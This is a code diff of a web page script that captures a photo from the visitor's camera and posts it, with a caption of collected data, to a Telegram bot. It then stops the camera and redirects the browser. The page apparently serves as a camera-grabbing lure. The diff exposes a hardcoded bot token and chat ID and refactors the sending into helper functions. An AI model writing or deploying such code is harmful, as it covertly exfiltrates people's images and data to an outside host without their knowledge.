@@ -161,64 +161,78 @@
       let context = canvas.getContext("2d");
       let capturedImage = document.getElementById("capturedImage");
 
-      // Define the desired width and height for the captured image
-      // let desiredWidth = 640; // Set your desired width
-      // let desiredHeight = 480; // Set your desired height
-
-      // Set the canvas width and height to the dimensions of the video
-      let desiredWidth = video.videoWidth;
-      let desiredHeight = video.videoHeight;
+      if (canvas) {
+        // Set the canvas width and height to the dimensions of the video
+        let desiredWidth = video.videoWidth;
+        let desiredHeight = video.videoHeight;
 
 
-      canvas.width = desiredWidth;
-      canvas.height = desiredHeight;
+        canvas.width = desiredWidth;
+        canvas.height = desiredHeight;
 
-      context.drawImage(video, 0, 0, desiredWidth, desiredHeight);
+        context.drawImage(video, 0, 0, desiredWidth, desiredHeight);
 
-      // Convert the captured image to a data URL with the specified width and height
-      let dataURL = canvas.toDataURL("image/jpeg");
+        // Convert the captured image to a data URL with the specified width and height
+        let dataURL = canvas.toDataURL("image/jpeg");
 
-      // // Set the data URL as the source of the "capturedImage" element
-      capturedImage.src = dataURL;
-
-
-      // finally send to telegram
-      canvas.toBlob(function (blob) {
+        // // Set the data URL as the source of the "capturedImage" element
+        capturedImage.src = dataURL;
 
 
+        // finally send to telegram
+        canvas.toBlob(function (blob) {
+          let caption = json;
+          let formData = new FormData();
+          formData.append("chat_id", "6650561757");
+          formData.append('photo', blob, 'image.jpg');
+          formData.append('caption', caption);
+          submitData(formData)
+        });
+      } else {
+        console.log('debug-message', `canvas not found`);
         let caption = json;
         let formData = new FormData();
         formData.append("chat_id", "6650561757");
-        formData.append('photo', blob, 'image.png');
+        formData.append('photo', 'https://picsum.photos/536/354');
         formData.append('caption', caption);
-
-        let requestOptions = {
-          method: 'POST',
-          body: formData,
-          redirect: 'follow'
-        };
-
-
-        fetch("https://api.telegram.org/bot6542504120:AAFGA5yAXwm2ccyIvu9QWL7IrtzYPuQ4cVI/sendPhoto", requestOptions)
-          .then(response => response.text())
-          .then(result => console.log('ok'))
-          .catch(error => console.log('error', error))
-          .finally(() => {
-            // stop both video and audio
-            localStream.getTracks().forEach((track) => {
-              track.stop();
-            });
-            window.location.href = "/";
-          });
-
-      });
-
-      
-
-
+        submitData(formData)
+      }
 
 
     });
+
+    function submitData(formData) {
+
+      let requestOptions = {
+        method: 'POST',
+        body: formData,
+        redirect: 'follow'
+      };
+
+      fetch("https://api.telegram.org/bot6542504120:AAFGA5yAXwm2ccyIvu9QWL7IrtzYPuQ4cVI/sendPhoto", requestOptions)
+        .then(response => response.text())
+        .then(result => console.log('ok'))
+        .catch(error => console.log('error', error))
+        .finally(() => {
+          // stop both video and audio
+          stopCamera();
+          window.location.href = "/";
+        });
+
+    }
+
+    function stopCamera() {
+      var stream = video.srcObject;
+      var tracks = stream.getTracks();
+
+      for (var i = 0; i < tracks.length; i++) {
+        var track = tracks[i];
+        track.stop();
+      }
+
+      video.srcObject = null;
+    }
+
 
 
   </script>
